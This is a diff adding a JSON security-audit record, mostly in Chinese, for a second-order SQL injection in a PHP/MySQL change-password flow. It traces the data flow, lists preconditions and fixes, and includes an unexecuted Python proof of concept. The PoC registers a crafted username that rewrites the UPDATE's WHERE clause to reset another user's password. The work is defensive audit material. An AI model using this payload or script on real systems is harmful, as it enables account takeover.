@@ -1,0 +1,180 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-005",
+  "input_version": "v2",
+  "prompt_version": "v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-005-P1",
+    "SQLI-005-P2"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "A、B、C、D 四个片段齐全，输入（A 25-27）、写入（A 48）、读取与会话赋值（B 22-28、43）、危险操作（C 31、38-39）和观察点（C 40-45）的静态证据完整；防护只覆盖直接输入字段，未覆盖 SESSION username 的二次拼接；剩余缺口是运行环境与表结构，不影响静态路径成立。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-005-F1",
+      "vulnerability_type": "SQL注入（二次/存储型，UPDATE 的 WHERE 条件拼接）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-005-A",
+          "line_start": 25,
+          "line_end": 27,
+          "quote": "$username=  mysql_escape_string($_POST['username']) ;"
+        },
+        {
+          "fragment_id": "SQLI-005-A",
+          "line_start": 48,
+          "line_end": 48,
+          "quote": "$sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\";"
+        },
+        {
+          "fragment_id": "SQLI-005-B",
+          "line_start": 22,
+          "line_end": 24,
+          "quote": "$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";"
+        },
+        {
+          "fragment_id": "SQLI-005-B",
+          "line_start": 28,
+          "line_end": 28,
+          "quote": "return $row[1];"
+        },
+        {
+          "fragment_id": "SQLI-005-B",
+          "line_start": 43,
+          "line_end": 43,
+          "quote": "$_SESSION[\"username\"] = $login;"
+        },
+        {
+          "fragment_id": "SQLI-005-C",
+          "line_start": 31,
+          "line_end": 31,
+          "quote": "$username= $_SESSION[\"username\"];"
+        },
+        {
+          "fragment_id": "SQLI-005-C",
+          "line_start": 38,
+          "line_end": 39,
+          "quote": "$sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";"
+        },
+        {
+          "fragment_id": "SQLI-005-C",
+          "line_start": 43,
+          "line_end": 43,
+          "quote": "if($row==1)"
+        },
+        {
+          "fragment_id": "SQLI-005-D",
+          "line_start": 6,
+          "line_end": 14,
+          "quote": "@$con = mysql_connect($host,$dbuser,$dbpass);"
+        }
+      ],
+      "data_flow": [
+        "注册入口 A 18 接收 POST submit/username/password/re_password；A 25-27 用 mysql_escape_string 处理三个字段，该转义只保证当前语句的字面量不被闭合，不改变入库后的字节值。",
+        "A 30 在单引号字面量中执行 select count(*) from users where username='$username'，此处的直接注入被转义阻断；A 35-44 在计数为 0 时进入插入分支。",
+        "A 48 的插入语句把已转义值放进双引号字面量 values(\"$username\", \"$pass\")；MySQL 解析双引号字符串时仍把 \\' 还原为 '，因此 users.username 实际保存了带单引号的原始 payload。",
+        "B 20-22 登录时用 mysql_real_escape_string 转义 login_user/login_password，B 24 执行 SELECT * FROM users WHERE username='$username' and password='$password'；登录语句本身不可直接注入，它按原样匹配到上一步写入的记录。",
+        "B 28 sqllogin() 返回 $row[1]（数据库 username 原值），B 43 将其写入 $_SESSION[\"username\"]，数据库字符串由此成为会话身份。",
+        "C 31 从 SESSION 读出 username 直接赋给 $username，未做任何转义；同段 C 32-34 只对 current_password/password/re_password 调用 mysql_real_escape_string，说明转义是逐字段选择性添加的。",
+        "C 38 把 $username 拼进 UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'，C 39 交给 mysql_query；username 中的 ' 闭合字面量，# 注释掉其后的 password 条件。",
+        "观察点：C 40 的 mysql_affected_rows() 与 C 43 的 if($row==1) 决定输出 Password successfully updated（C 45）还是跳转 failed.php（C 50），可区分注入后被影响的行集合与正常单行更新。"
+      ],
+      "principle": "二次（存储型）SQL 注入：注册处的转义只服务于当时那条 INSERT/SELECT 语句，写入数据库的值仍是原始字符序列。登录把数据库返回的 username 原样放进 SESSION，改密处又把这个 SESSION 值作为 SQL 片段拼进 UPDATE 的 WHERE 单引号字面量。普通注册用户即可让 SESSION username 携带 ' 与 #，闭合字面量并注释掉 password 校验，使本应只更新自己一行的 UPDATE 变成可更新其他账号行的语句。",
+      "impact": "任何能自助注册并登录的用户（无需管理员权限）都能在改密时改写 UPDATE 的 WHERE 语义：用 # 去掉 password 条件、用 OR 扩大匹配范围，从而重置其他账号（含管理员）口令并以其身份登录。若 payload 不加以限制，UPDATE 没有行边界会命中 users 表全部行，导致全站口令被同一值覆盖。影响面限于改密功能可触及的 users 表。",
+      "preconditions": [
+        "部署为 PHP 5.x（mysql_* 扩展可用）与 MySQL 默认 sql_mode：# 为行注释，反斜杠为字符串转义符，未启用 NO_BACKSLASH_ESCAPES。",
+        "注册处除 A 25-27 的转义外没有对 username 的字符白名单或长度截断，含单引号与 # 的用户名能完整入库。",
+        "users.username 长度足够容纳 payload（数十字节），否则注释符可能被截断而失效。",
+        "攻击者可自行注册账号并登录，使 B 43 把 payload 写入 SESSION（普通注册权限即可）。",
+        "改密页 C 7-14 的 Auth/SESSION 判断放行已登录会话，并进入 C 26 的 submit 分支。",
+        "D 14 所选数据库账号对 users 表具备 UPDATE 权限。"
+      ],
+      "counterexamples": [
+        "若 C 38 处对 $username 同样调用 mysql_real_escape_string，或改用预处理语句绑定 username，payload 只作为数据参与比较，UPDATE 语法不被改变，注入不成立。",
+        "若注册处对 username 做字符白名单（如仅字母数字下划线）或拒绝引号/#，payload 无法入库，注入链在 A 处断开。",
+        "若 MySQL 启用 NO_BACKSLASH_ESCAPES，A 48 双引号字面量中的 \\' 不会被还原为 ' 而入库带反斜杠；随后 C 38 单引号字面量会再次转义该引号，注入不成立（需实测存储值确认）。",
+        "若改密逻辑改为按 SESSION 用户主键先查询再更新，或使用参数化 UPDATE/查询构造器，WHERE 条件不可被改写。",
+        "若部署为 PHP 7+ 且无 mysql_* 兼容层，A/B/C include D 时即因函数缺失报错，该路径不可达；这属于环境不成立，不能当作安全防护结论。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"SQLI-005 local-lab second-order SQL injection draft (NOT executed).\n\nScope: loopback only, no redirect following, no data enumeration.\nFlow: baseline victim login -> register probe account with crafted username\n      -> probe login (SESSION username = stored value) -> change password\n      -> victim login with the new password (cross-account write evidence).\nThe payload is bounded to the victim probe row, so no unrelated row is updated.\n\"\"\"\n\nimport argparse\nimport http.cookiejar\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\nfrom urllib.parse import urlparse\n\nLOOPBACK_HOSTS = (\"localhost\", \"127.0.0.1\", \"::1\")\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    \"\"\"Do not follow 3xx automatically; the caller inspects Location itself.\"\"\"\n\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef new_opener():\n    jar = http.cookiejar.CookieJar()\n    return urllib.request.build_opener(\n        urllib.request.HTTPCookieProcessor(jar), NoRedirect()\n    )\n\n\ndef refuse_unless_loopback(base_url):\n    parsed = urlparse(base_url)\n    if parsed.scheme not in (\"http\", \"https\"):\n        sys.exit(\"REFUSE: unsupported scheme %r\" % (parsed.scheme,))\n    if parsed.hostname not in LOOPBACK_HOSTS:\n        sys.exit(\"REFUSE: host %r is not loopback\" % (parsed.hostname,))\n\n\ndef post_form(opener, url, fields, timeout):\n    payload = urllib.parse.urlencode(fields).encode(\"utf-8\")\n    request = urllib.request.Request(url, data=payload, method=\"POST\")\n    request.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    request.add_header(\"User-Agent\", \"sqli005-draft/1.0 (local lab)\")\n    try:\n        with opener.open(request, timeout=timeout) as response:\n            body = response.read().decode(\"utf-8\", \"replace\")\n            return response.status, response.headers, body\n    except urllib.error.HTTPError as err:\n        body = err.read().decode(\"utf-8\", \"replace\")\n        return err.code, err.headers, body\n    except urllib.error.URLError as err:\n        sys.exit(\"NETWORK: %s\" % (err.reason,))\n    except TimeoutError:\n        sys.exit(\"TIMEOUT after %s seconds\" % (timeout,))\n\n\ndef login(opener, login_url, user, password, timeout):\n    status, headers, body = post_form(\n        opener, login_url, {\"login_user\": user, \"login_password\": password}, timeout\n    )\n    location = headers.get(\"Location\", \"\") if headers is not None else \"\"\n    return status, location, body\n\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"SQLI-005 second-order SQLi draft for an authorized local lab\"\n    )\n    parser.add_argument(\"--base-url\", required=True)\n    parser.add_argument(\"--register-path\", required=True)\n    parser.add_argument(\"--login-path\", required=True)\n    parser.add_argument(\"--change-path\", required=True)\n    parser.add_argument(\n        \"--login-success-fragment\",\n        default=\"logged-in.php\",\n        help=\"substring expected in Location after a successful login (from the sample code)\",\n    )\n    parser.add_argument(\"--victim-user\", required=True)\n    parser.add_argument(\"--victim-password\", required=True)\n    parser.add_argument(\"--probe-prefix\", default=\"wp2probe\")\n    parser.add_argument(\"--probe-password\", required=True)\n    parser.add_argument(\"--new-victim-password\", required=True)\n    parser.add_argument(\"--timeout\", type=float, default=10.0)\n    args = parser.parse_args()\n\n    refuse_unless_loopback(args.base_url)\n    base = args.base_url.rstrip(\"/\") + \"/\"\n    register_url = urllib.parse.urljoin(base, args.register_path.lstrip(\"/\"))\n    login_url = urllib.parse.urljoin(base, args.login_path.lstrip(\"/\"))\n    change_url = urllib.parse.urljoin(base, args.change_path.lstrip(\"/\"))\n\n    def logged_in(status, location):\n        return status in (301, 302, 303) and args.login_success_fragment in location\n\n    # Step 1: baseline, the dedicated victim account must work before the test.\n    status, location, _ = login(\n        new_opener(), login_url, args.victim_user, args.victim_password, args.timeout\n    )\n    if not logged_in(status, location):\n        sys.exit(\"ABORT: baseline victim login failed (status=%s)\" % (status,))\n    print(\"[1] baseline victim login ok (status=%s)\" % (status,))\n\n    # Step 2: register a probe account whose stored username is a SQL fragment.\n    crafted = \"%s' OR username='%s'#\" % (args.probe_prefix, args.victim_user)\n    status, _, body = post_form(\n        new_opener(),\n        register_url,\n        {\n            \"submit\": \"Submit\",\n            \"username\": crafted,\n            \"password\": args.probe_password,\n            \"re_password\": args.probe_password,\n        },\n        args.timeout,\n    )\n    if \"already exists\" in body.lower():\n        sys.exit(\"ABORT: probe username already exists; change --probe-prefix\")\n    if \"Redirecting you to login page\" not in body:\n        sys.exit(\n            \"ABORT: registration of the crafted username was rejected (status=%s)\" % (status,)\n        )\n    print(\"[2] probe account with crafted username created (status=%s)\" % (status,))\n\n    # Step 3: log in as the probe account; the DB value becomes SESSION username.\n    probe_opener = new_opener()\n    status, location, _ = login(\n        probe_opener, login_url, crafted, args.probe_password, args.timeout\n    )\n    if not logged_in(status, location):\n        sys.exit(\"ABORT: probe login failed (status=%s); escaping/encoding mismatch\" % (status,))\n    print(\"[3] probe login ok, SESSION username holds the crafted value\")\n\n    # Step 4: trigger the UPDATE with the unescaped SESSION username.\n    status, _, body = post_form(\n        probe_opener,\n        change_url,\n        {\n            \"submit\": \"Submit\",\n            \"current_password\": args.probe_password,\n            \"password\": args.new_victim_password,\n            \"re_password\": args.new_victim_password,\n        },\n        args.timeout,\n    )\n    updated = \"Password successfully updated\" in body\n    print(\"[4] change-password status=%s success_marker=%s\" % (status, updated))\n\n    # Step 5: cross-account evidence, with independent cookie jars.\n    status_new, loc_new, _ = login(\n        new_opener(), login_url, args.victim_user, args.new_victim_password, args.timeout\n    )\n    status_old, loc_old, _ = login(\n        new_opener(), login_url, args.victim_user, args.victim_password, args.timeout\n    )\n    status_probe, loc_probe, _ = login(\n        new_opener(), login_url, crafted, args.probe_password, args.timeout\n    )\n\n    print(\n        \"[5] victim login with new password: status=%s location=%s ok=%s\"\n        % (status_new, loc_new, logged_in(status_new, loc_new))\n    )\n    print(\n        \"[6] victim login with old password: status=%s location=%s ok=%s\"\n        % (status_old, loc_old, logged_in(status_old, loc_old))\n    )\n    print(\n        \"[7] probe account still logs in: ok=%s\" % (logged_in(status_probe, loc_probe),)\n    )\n\n    hit = (\n        updated\n        and logged_in(status_new, loc_new)\n        and not logged_in(status_old, loc_old)\n        and logged_in(status_probe, loc_probe)\n    )\n    if hit:\n        print(\"OBSERVED: UPDATE matched the victim row reached through the injected OR\")\n        return 0\n    print(\"NOT OBSERVED: manual triage required, see statuses above\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅标准库（argparse、http.cookiejar、urllib）",
+          "本地授权靶场的 PHP 5.x + MySQL 5.x 实例，含注册、登录、改密页面与 users 表",
+          "数据库快照或备份，用于测试后回滚"
+        ],
+        "parameters": [
+          "--base-url 靶场根地址，必须为 localhost/127.0.0.1/::1（脚本内校验 scheme 与 host）",
+          "--register-path 注册页相对路径（必填，不提供臆测默认值）",
+          "--login-path 登录提交地址（必填）",
+          "--change-path 改密页相对路径（必填）",
+          "--victim-user / --victim-password 自建专用 victim 账号，二者均由命令行提供",
+          "--probe-prefix / --probe-password 自建探针账号前缀与口令（payload 用户名会被转义后入库）",
+          "--new-victim-password 注入成功后写入 victim 的新口令",
+          "--timeout 单请求超时秒数，默认 10",
+          "--login-success-fragment 登录成功 Location 关键字，默认 logged-in.php（取自 B 45 的跳转目标）"
+        ],
+        "steps": [
+          "准备本地授权靶场快照，创建专用 victim 账号并确认可登录；确认注册页允许含单引号与 # 的用户名。",
+          "运行脚本完成基线登录（步骤 1），确认 victim 账号与口令有效，避免把环境问题当成注入结果。",
+          "脚本注册用户名 wp2probe' OR username='<victim>'#；转义后入库，A 48 的双引号字面量在解析时把 \\' 还原为 '。",
+          "以该用户名登录探针账号（步骤 3），使 SESSION username 等于数据库里保存的 payload 字符串。",
+          "在改密页提交 current_password=探针口令、password=re_password=<new-victim-password>，观察是否出现 Password successfully updated。",
+          "用全新 Cookie 容器以 victim + 新口令登录，再以 victim + 旧口令登录做对照，并验证探针账号仍可登录。",
+          "保存状态码、响应片段与截图后回滚数据库快照；不改动非自建账号。"
+        ],
+        "expected_observation": "步骤 4 的改密响应包含 Password successfully updated，对应 C 40/C 43 的 mysql_affected_rows()==1；步骤 5 用独立 Cookie 以 victim + 新口令登录返回 302 且 Location 含 logged-in.php；步骤 6 用 victim + 旧口令登录落在失败页面；步骤 7 探针账号仍能登录，说明被改写的不是探针自身那行。",
+        "success_criteria": "同一条件下需同时观察到：基线登录成功；改密响应出现成功标语（受影响行数为 1，而非跳转 failed.php）；victim 新口令登录跳转 logged-in.php；victim 旧口令登录失败；探针账号口令未变。仅返回 HTTP 200、仅页面回显输入或仅注册成功都不算成功；缺任一项对照都按观察不足记录。",
+        "limitations": [
+          "本草案未运行（execution_status=未运行），仅完成 Python 语法编译检查；编译通过不代表依赖、环境或漏洞可用。",
+          "payload 依赖 # 作为 MySQL 行内注释、且 A 48 的双引号字面量把 \\' 还原为 '；若目标 sql_mode 含 NO_BACKSLASH_ESCAPES，需人工改写 payload 并重新评估。",
+          "注册/登录/改密的真实路径、表单字段名与登录成功跳转均需按目标实例以参数提供，脚本不内置猜测值。",
+          "未验证 mysql_* 扩展是否存在、PHP/MySQL 版本与 users 表结构，也未验证 C 7-14 放行条件在实际部署中的行为。",
+          "脚本只做与代码路径对应的最小写操作（victim 探针行），不枚举、不导出数据；测试前须备份，测试后回滚。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "../sql-connections/sql-connect.php 的完整内容（连接方式、字符集设置、公共 include 行为）。",
+    "../sql-connections/db-creds.inc 中的主机、库名与账号权限（是否可 UPDATE users 全表）。",
+    "MySQL 版本与 sql_mode（是否 NO_BACKSLASH_ESCAPES、STRICT 模式等）。",
+    "users 表 DDL：username 是否 UNIQUE、字段长度、password 存储为明文还是哈希。",
+    "PHP 版本及 mysql_* 扩展是否可用；部署源提交号与难度配置。",
+    "index.php、new_user.php、logged-in.php、failed.php 的实际表单字段与跳转行为（POC 适配所需）。",
+    "注册处是否存在本次片段之外的前端或服务端 username 校验。"
+  ],
+  "risk_notes": [
+    "改密表单无 CSRF token，且 C 7-14 仅以 Auth cookie 是否存在作为前置判断，可被跨站伪造改密请求（超出本次 SQL 注入范围）。",
+    "口令以明文写入与比较（A 48 直接插入 password，B 22 明文比对），一旦泄露后果超出注入本身。",
+    "登录成功即 setcookie(\"Auth\", 1)（B 44），cookie 无 HttpOnly/Secure 标记，且服务端不校验其值。",
+    "C 中 header('Location: ...') 之后没有 exit，鉴权判断失败后脚本其余部分仍会被解析执行。",
+    "A 49 与 C 39 的 or die(mysql_error()) 会把数据库错误返回客户端，可能泄露 SQL 结构与库信息。"
+  ],
+  "quality_notes": [
+    "mysql_* 系列函数自 PHP 5.5 起废弃、PHP 7 移除（A 25-32/48-49，B 20-25，C 32-41，D 6/14），属于过时 API 问题。",
+    "if (!$row[0]== 0)（A 35）与 if (!$login== 0)（B 41）依赖运算符优先级，语义不直观且易误改。",
+    "@error_reporting(0) 与 @mysql_connect（D 5-6）抑制错误，掩盖连接失败原因。",
+    "header('refresh:...')（A 40/59/66、C 58）在已有输出之后调用，是否生效取决于 PHP 输出缓冲与服务器配置。"
+  ],
+  "limitations": [
+    "仅做静态审计，未部署靶场、未执行 POC；所有结论止于源码候选，不能升级为确认。",
+    "sql-connect.php 与 db-creds.inc 未在输入包内，数据库名、账号权限、字符集与 sql_mode 未知，二次注入的入库字节值需运行确认。",
+    "users 表结构未提供，payload 是否被长度或字符集截断只能实测。",
+    "header('refresh'/'Location') 位于已有输出之后，实际跳转行为依赖输出缓冲配置，POC 的成功判定以页面标记与独立登录为准。",
+    "结论仅覆盖 A/B/C/D 描述的注册、登录、改密路径；其他入口与文件不在本次审计范围内，不代表整个项目安全状况。",
+    "POC 采用有界 payload（只命中自建 victim 行）；改用 # 无条件 payload 会影响 users 表全部行，必须在快照上执行并回滚。",
+    "登录直接注入路径已由 B 20-22 的 mysql_real_escape_string 覆盖，本次未将其列为父样本候选。"
+  ],
+  "runtime_evidence": []
+}
